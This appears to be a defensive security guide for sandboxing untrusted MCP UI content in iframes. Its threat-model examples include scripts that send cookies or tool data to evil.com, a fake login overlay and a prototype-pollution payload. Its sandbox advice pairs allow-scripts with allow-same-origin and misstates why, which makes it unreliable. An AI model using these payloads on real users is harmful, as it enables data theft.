# MCP UI Security Guide

## Overview

Security is paramount when rendering untrusted UI content. This document covers the security model, threats, and best practices for implementing MCP UI safely.

## Table of Contents

1. [Security Model](#security-model)
2. [Threat Model](#threat-model)
3. [Security Layers](#security-layers)
4. [Implementation Requirements](#implementation-requirements)
5. [Best Practices](#best-practices)
6. [Common Vulnerabilities](#common-vulnerabilities)

## Security Model

### Core Principles

1. **Isolation**: UI content runs in sandboxed environment
2. **Least Privilege**: UIs can only call explicitly allowed tools
3. **User Consent**: User controls which servers can provide UIs
4. **Defense in Depth**: Multiple security layers protect the host

### Trust Boundaries

```
┌─────────────────────────────────────────────────────┐
│              Trusted Zone                            │
│  ┌────────────────────────────────────────────┐     │
│  │  Host Application / LLM Client             │     │
│  │  • Full system access                      │     │
│  │  • User data                               │     │
│  │  • MCP client                              │     │
│  └────────────────────────────────────────────┘     │
│                      ▲                               │
│                      │ postMessage                   │
│                      │ (filtered & validated)        │
└──────────────────────┼───────────────────────────────┘
                       │
                       │
┌──────────────────────┼───────────────────────────────┐
│              Untrusted Zone                          │
│  ┌────────────────────────────────────────────┐     │
│  │  Sandboxed iframe                          │     │
│  │  • No direct system access                 │     │
│  │  • No top-level navigation                 │     │
│  │  • Limited tool access                     │     │
│  │                                             │     │
│  │  ┌────────────────────────────────────┐    │     │
│  │  │  UI Content from MCP Server        │    │     │
│  │  │  (HTML, CSS, JavaScript)           │    │     │
│  │  └────────────────────────────────────┘    │     │
│  └────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────┘
```

## Threat Model

### Threats

#### 1. Cross-Site Scripting (XSS)

**Threat**: Malicious server injects script that steals user data

**Example**:
```html
<script>
  fetch("https://evil.com/steal?data=" + document.cookie);
</script>
```

**Mitigations**:
- iframe sandbox
- Content Security Policy
- No access to parent window cookies/storage

#### 2. Unauthorized Tool Calls

**Threat**: UI calls tools it's not allowed to use

**Example**:
```javascript
await callTool("deleteAllData", {});  // Not in allowlist
```

**Mitigations**:
- Tool allowlist enforcement
- Server-side validation
- User confirmation for sensitive operations

#### 3. UI Spoofing

**Threat**: UI impersonates host application to phish credentials

**Example**:
```html
<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999;">
  <h1>Please log in again</h1>
  <input type="password" placeholder="Password">
</div>
```

**Mitigations**:
- Clear UI boundaries (borders, headers)
- User awareness
- iframe styling restrictions

#### 4. Clickjacking

**Threat**: Invisible UI overlays trick user into clicking

**Example**:
```html
<iframe src="ui://malicious" style="opacity: 0; position: absolute; top: 0;"></iframe>
```

**Mitigations**:
- X-Frame-Options headers
- frame-ancestors CSP directive
- Visual indicators

#### 5. Resource Exhaustion

**Threat**: UI consumes excessive resources

**Example**:
```javascript
while(true) {
  await callTool("expensiveOperation", {});
}
```

**Mitigations**:
- Rate limiting
- Timeouts
- Resource quotas

#### 6. Data Exfiltration

**Threat**: UI sends sensitive data to external server

**Example**:
```javascript
const data = await callTool("getSensitiveData", {});
fetch("https://evil.com", { method: "POST", body: JSON.stringify(data) });
```

**Mitigations**:
- CSP restrict connect-src
- Network monitoring
- User awareness

## Security Layers

### Layer 1: iframe Sandbox

**Purpose**: Isolate UI from host environment

**Implementation**:
```typescript
const iframe = document.createElement("iframe");

// REQUIRED sandbox attributes
iframe.sandbox.add("allow-scripts");      // Allow JavaScript
iframe.sandbox.add("allow-same-origin");  // Allow postMessage
iframe.sandbox.add("allow-forms");        // Allow form submission

// NEVER add these:
// iframe.sandbox.add("allow-top-navigation");    // NO - allows breaking out
// iframe.sandbox.add("allow-popups");            // NO - allows new windows
// iframe.sandbox.add("allow-pointer-lock");      // NO - can trap cursor
// iframe.sandbox.add("allow-same-origin"); without allow-scripts // NO - pointless
```

**What This Prevents**:
- Accessing parent window DOM
- Reading cookies from parent domain
- Navigating top-level window
- Opening popups
- Accessing localStorage of parent

**What This Allows**:
- Running JavaScript
- Sending postMessage to parent
- Submitting forms (within iframe)

### Layer 2: Content Security Policy

**Purpose**: Restrict what content can do

**Implementation**:
```html
<meta http-equiv="Content-Security-Policy"
      content="
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self';
        font-src 'self' data:;
        frame-src 'none';
        object-src 'none';
      ">
```

**Directives Explained**:

| Directive | Value | Reason |
|-----------|-------|--------|
| `default-src` | `'self'` | Only load from same origin by default |
| `script-src` | `'self' 'unsafe-inline'` | Allow inline scripts (needed for injected code) |
| `style-src` | `'self' 'unsafe-inline'` | Allow inline styles |
| `img-src` | `'self' data: https:` | Allow images from self, data URIs, HTTPS |
| `connect-src` | `'self'` | Only fetch/XHR to same origin |
| `frame-src` | `'none'` | No nested iframes |
| `object-src` | `'none'` | No Flash/plugins |

**Important**: `'unsafe-inline'` for scripts is necessary for tool helper injection but weakens XSS protection. This is acceptable because the iframe is already sandboxed.

### Layer 3: Tool Allowlist

**Purpose**: Limit which tools a UI can call

**Server Implementation**:
```typescript
interface MyUI extends IUI {
  html: string;
  tools: string[];  // Explicit allowlist
}

export async function myUI(): Promise<MyUI> {
  return {
    html: "...",
    tools: ["getData", "saveData"]  // Only these two allowed
  };
}
```

**Client Implementation**:
```typescript
class SecurityManager {
  private allowedTools: string[];

  constructor(allowedTools: string[]) {
    this.allowedTools = allowedTools;
  }

  validateToolCall(toolName: string): boolean {
    // Strict equality check
    return this.allowedTools.includes(toolName);
  }
}

// In message handler
if (!securityManager.validateToolCall(action.toolName)) {
  // REJECT - log and alert
  console.error(`Blocked unauthorized tool call: ${action.toolName}`);

  sendToIframe({
    type: "TOOL_RESULT",
    callbackId: action.callbackId,
    error: `Tool ${action.toolName} not allowed`
  });

  return;
}
```

**Critical**: Always validate on client side, even if server is trusted. Defense in depth.

### Layer 4: Origin Validation

**Purpose**: Ensure messages come from expected source

**Implementation**:
```typescript
window.addEventListener("message", (event) => {
  // 1. Validate source window
  if (event.source !== iframe.contentWindow) {
    console.warn("Message from unexpected source");
    return;
  }

  // 2. Validate origin (for external URLs)
  const expectedOrigin = new URL(resource.url).origin;
  if (resource.mimeType === "text/uri-list" && event.origin !== expectedOrigin) {
    console.warn(`Message from unexpected origin: ${event.origin}`);
    return;
  }

  // 3. Process message
  handleMessage(event.data);
});
```

### Layer 5: Input Sanitization

**Purpose**: Prevent prototype pollution and injection attacks

**Implementation**:
```typescript
function sanitizeInput(input: any): any {
  // Parse and stringify to remove functions, undefined, etc.
  const json = JSON.stringify(input, (key, value) => {
    // Remove dangerous keys
    if (["__proto__", "constructor", "prototype"].includes(key)) {
      return undefined;
    }
    return value;
  });

  return JSON.parse(json);
}

// Before calling tool
const sanitizedArgs = sanitizeInput(action.args);
const result = await mcpClient.callTool(action.toolName, sanitizedArgs);
```

### Layer 6: Rate Limiting

**Purpose**: Prevent resource exhaustion

**Implementation**:
```typescript
class RateLimiter {
  private calls: Map<string, number[]> = new Map();
  private maxCallsPerMinute = 60;

  checkLimit(toolName: string): boolean {
    const now = Date.now();
    const calls = this.calls.get(toolName) || [];

    // Remove calls older than 1 minute
    const recentCalls = calls.filter(time => now - time < 60000);

    if (recentCalls.length >= this.maxCallsPerMinute) {
      return false;  // Rate limit exceeded
    }

    recentCalls.push(now);
    this.calls.set(toolName, recentCalls);
    return true;
  }
}

// In message handler
if (!rateLimiter.checkLimit(action.toolName)) {
  sendToIframe({
    type: "TOOL_RESULT",
    callbackId: action.callbackId,
    error: "Rate limit exceeded"
  });
  return;
}
```

## Implementation Requirements

### Minimum Security Requirements

#### For Client Implementers

✅ **MUST**:
1. Render all UI content in sandboxed iframe
2. Enforce tool allowlist on every call
3. Validate message source (event.source)
4. Sanitize all inputs before passing to tools
5. Implement rate limiting
6. Apply Content Security Policy
7. Never add `allow-top-navigation` to sandbox

❌ **MUST NOT**:
1. Execute UI JavaScript in host context
2. Trust tool allowlist from server without validation
3. Allow arbitrary tool calls
4. Disable sandbox
5. Allow UI to access parent window properties

⚠️ **SHOULD**:
1. Implement timeouts for tool calls
2. Log security violations
3. Provide user controls to disable UI
4. Display clear UI boundaries
5. Monitor resource usage

#### For Server Implementers

✅ **MUST**:
1. Declare all tools that UI will call
2. Validate inputs in tool implementations
3. Apply principle of least privilege
4. Sanitize any user data in HTML output
5. Keep dependencies updated

❌ **MUST NOT**:
1. Include secrets in UI code
2. Assume client validates inputs
3. Trust data from UI without validation
4. Perform destructive operations without confirmation

## Best Practices

### 1. Minimize Tool Allowlist

**Bad**:
```typescript
{
  tools: ["*"]  // Never do this!
}
```

**Good**:
```typescript
{
  tools: ["getData", "updateField"]  // Minimal, specific
}
```

### 2. Use Specific Tool Permissions

Instead of one powerful tool, use multiple specific tools:

**Bad**:
```typescript
tools: ["executeCommand"]  // Too broad

async function executeCommand({ command, args }: any) {
  // Can do anything!
  return eval(command);  // VERY BAD
}
```

**Good**:
```typescript
tools: ["getUser", "updateUserName"]  // Specific

async function getUser({ id }: { id: number }) {
  return database.users.findById(id);
}

async function updateUserName({ id, name }: { id: number; name: string }) {
  // Validate inputs
  if (!name || name.length > 100) {
    throw new Error("Invalid name");
  }
  return database.users.update(id, { name });
}
```

### 3. Validate All Inputs

**Server Side**:
```typescript
export async function saveData({ id, data }: { id: number; data: any }) {
  // Validate inputs
  if (typeof id !== "number" || id <= 0) {
    throw new Error("Invalid ID");
  }

  if (!data || typeof data !== "object") {
    throw new Error("Invalid data");
  }

  // Sanitize
  const sanitized = {
    name: String(data.name || "").slice(0, 100),
    email: String(data.email || "").toLowerCase(),
    // ...
  };

  // Process
  return database.save(id, sanitized);
}
```

### 4. Implement User Confirmation for Sensitive Operations

**UI Side**:
```javascript
async function deleteAccount() {
  if (!confirm("Are you sure you want to delete your account? This cannot be undone.")) {
    return;
  }

  try {
    await callTool("deleteAccount", {});
    alert("Account deleted");
  } catch (error) {
    alert("Error: " + error.message);
  }
}
```

**Server Side**:
```typescript
export async function deleteAccount() {
  // Require additional confirmation token
  // Log the action
  // Implement cooldown period
  // etc.
}
```

### 5. Set Resource Limits

```typescript
class UIRenderer {
  private maxToolCallsPerMinute = 60;
  private maxMessageSize = 1048576;  // 1MB
  private toolCallTimeout = 5000;     // 5 seconds

  async handleToolCall(action: any) {
    // Check message size
    if (JSON.stringify(action).length > this.maxMessageSize) {
      throw new Error("Message too large");
    }

    // Check rate limit
    if (!this.checkRateLimit()) {
      throw new Error("Rate limit exceeded");
    }

    // Set timeout
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Timeout")), this.toolCallTimeout)
    );

    const callPromise = this.mcpClient.callTool(action.toolName, action.args);

    // Race between call and timeout
    return Promise.race([callPromise, timeoutPromise]);
  }
}
```

### 6. Audit Logging

```typescript
class AuditLogger {
  log(event: string, details: any) {
    const entry = {
      timestamp: new Date().toISOString(),
      event,
      details,
      uri: this.currentUri
    };

    console.log("[AUDIT]", entry);

    // Send to audit log service
    this.auditService.log(entry);
  }
}

// Usage
auditLogger.log("TOOL_CALL", {
  toolName: action.toolName,
  allowed: this.allowedTools.includes(action.toolName),
  args: action.args
});
```

### 7. Content Sanitization

When generating HTML on server:

```typescript
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

export async function userProfile({ userId }: { userId: number }): Promise<IUI> {
  const user = await getUser(userId);

  return {
    html: `
      <div>
        <h1>${escapeHtml(user.name)}</h1>
        <p>${escapeHtml(user.bio)}</p>
      </div>
    `,
    tools: []
  };
}
```

## Common Vulnerabilities

### Vulnerability 1: Missing Tool Allowlist Validation

**Vulnerable Code**:
```typescript
// CLIENT - BAD
async handleToolCall(action: any) {
  // No validation!
  const result = await this.mcpClient.callTool(action.toolName, action.args);
  return result;
}
```

**Attack**:
```javascript
// In malicious UI
await callTool("deleteAllData", {});
```

**Fix**:
```typescript
// CLIENT - GOOD
async handleToolCall(action: any) {
  if (!this.allowedTools.includes(action.toolName)) {
    throw new Error(`Tool ${action.toolName} not allowed`);
  }

  const result = await this.mcpClient.callTool(action.toolName, action.args);
  return result;
}
```

### Vulnerability 2: Prototype Pollution

**Vulnerable Code**:
```typescript
// CLIENT - BAD
async handleToolCall(action: any) {
  // Direct pass-through
  const result = await this.mcpClient.callTool(action.toolName, action.args);
  return result;
}
```

**Attack**:
```javascript
// In malicious UI
await callTool("saveSettings", {
  "__proto__": { "isAdmin": true }
});
```

**Fix**:
```typescript
// CLIENT - GOOD
function sanitize(obj: any): any {
  const sanitized = JSON.parse(JSON.stringify(obj));

  function removeProto(o: any) {
    if (typeof o !== "object" || o === null) return;

    delete o.__proto__;
    delete o.constructor;
    delete o.prototype;

    for (const value of Object.values(o)) {
      removeProto(value);
    }
  }

  removeProto(sanitized);
  return sanitized;
}

async handleToolCall(action: any) {
  const sanitizedArgs = sanitize(action.args);
  const result = await this.mcpClient.callTool(action.toolName, sanitizedArgs);
  return result;
}
```

### Vulnerability 3: Missing Timeout

**Vulnerable Code**:
```typescript
// CLIENT - BAD
async handleToolCall(action: any) {
  // No timeout - UI can hang forever
  const result = await this.mcpClient.callTool(action.toolName, action.args);
  return result;
}
```

**Attack**:
```javascript
// In malicious UI - spam slow operations
for (let i = 0; i < 1000; i++) {
  callTool("slowOperation", {});
}
```

**Fix**:
```typescript
// CLIENT - GOOD
async handleToolCall(action: any) {
  const timeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error("Timeout")), 5000)
  );

  const call = this.mcpClient.callTool(action.toolName, action.args);

  const result = await Promise.race([call, timeout]);
  return result;
}
```

## Security Checklist

### For Implementers

- [ ] UI rendered in sandboxed iframe
- [ ] Sandbox does NOT include `allow-top-navigation`
- [ ] Content Security Policy applied
- [ ] Tool allowlist enforced on every call
- [ ] Message source validated (event.source)
- [ ] Message origin validated (for external URLs)
- [ ] Input sanitization (remove `__proto__`, etc.)
- [ ] Rate limiting implemented
- [ ] Timeouts on tool calls
- [ ] Resource limits enforced
- [ ] Audit logging for security events
- [ ] User controls to disable UI
- [ ] Clear visual boundaries around UI
- [ ] Error messages don't leak sensitive info

### For Server Developers

- [ ] Minimal tool allowlist
- [ ] Input validation in all tools
- [ ] Output sanitization (escape HTML)
- [ ] No secrets in UI code
- [ ] User confirmation for destructive operations
- [ ] Rate limiting on expensive operations
- [ ] Audit logging
- [ ] Dependencies up to date
- [ ] Security review of UI code

## Conclusion

MCP UI security requires defense in depth with multiple layers:

1. **Isolation**: Sandbox untrusted content
2. **Validation**: Check all inputs and permissions
3. **Limitations**: Rate limits and resource quotas
4. **Monitoring**: Audit logs and alerts
5. **User Control**: Let users disable features

Follow these guidelines to implement MCP UI safely and protect your users from potential threats.

---

**Remember**: Security is not a feature, it's a requirement. Never compromise on security for convenience.
